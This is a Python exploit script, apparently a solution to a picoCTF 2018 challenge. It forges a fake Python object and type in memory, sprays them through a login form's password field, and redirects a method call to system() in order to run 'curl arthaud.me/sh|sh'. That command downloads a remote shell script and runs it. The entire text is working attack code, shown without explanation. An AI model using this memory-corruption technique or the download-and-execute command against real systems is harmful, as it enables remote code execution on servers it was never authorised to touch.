#!/usr/bin/env python3
import struct
import requests


def p(v):
    return struct.pack('<I', v)


cmd = b'curl arthaud.me/sh|sh\x00'

system_addr = 0x0805a2f0
call_gadget = 0x81580d6  # push edx; call [eax + 0x18]
fake_object_addr = 0x84d673c
fake_type_addr = fake_object_addr + 0x1c

fake_object = p(1)  # ref counter
fake_object += p(fake_type_addr)  # type object
fake_object += b'\x00' * 16
fake_object += p(system_addr)

assert len(cmd) <= 24
fake_type = cmd.ljust(24, b'\x00')
fake_type += p(call_gadget)

payload = b'I' * 32
payload += p(fake_object_addr)

data = (fake_object + fake_type) * 500

qs = {'username=': ''.join('%%%02x' % c for c in payload), 'password':''.join('%%%02x' % c for c in data)}
i = 1
while True:
    print('\rAttempt %d' % i, end='')
    i += 1
    requests.post('http://2018shell2.picoctf.com:13747/login', data=qs)